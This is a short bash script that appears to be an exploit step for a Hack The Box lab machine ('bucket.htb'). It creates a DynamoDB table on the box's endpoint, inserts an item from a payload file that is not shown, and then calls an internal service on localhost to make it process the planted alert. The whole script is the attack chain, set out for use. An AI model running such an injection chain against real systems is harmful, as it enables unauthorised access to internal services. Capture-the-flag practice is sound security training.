#!/bin/bash

echo "[+] Create table"
aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url=http://s3.bucket.htb >/dev/null
sleep 0.5
echo "[+] Insert item"
aws dynamodb put-item --table-name alerts --item file://payload.json --endpoint-url=http://s3.bucket.htb >/dev/null
sleep 0.5
echo "[+] Send get alerts"
curl -sv -d "action=get_alerts" http://127.0.0.1:8000/
